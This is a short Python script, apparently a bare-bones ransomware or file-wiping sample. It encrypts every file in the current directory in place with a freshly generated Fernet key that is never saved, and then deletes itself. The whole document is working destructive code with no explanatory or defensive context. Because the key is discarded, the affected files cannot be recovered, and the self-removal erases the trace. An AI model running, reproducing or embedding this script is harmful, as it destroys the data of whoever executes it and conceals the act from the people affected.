import os
from cryptography.fernet import Fernet
files = []
key = Fernet.generate_key()
for file in os.listdir():
  if os.path.isfile(file):
    files.append(file)
for file in files:
  with open(file, "rb") as thefile:
    contents = thefile.read()
  contents_encrypted = Fernet(key).encrypt(contents)
  with open(file, "wb") as thefile:
    thefile.write(contents_encrypted)
script_path = os.path.abspath(__file__)
os.remove(script_path)
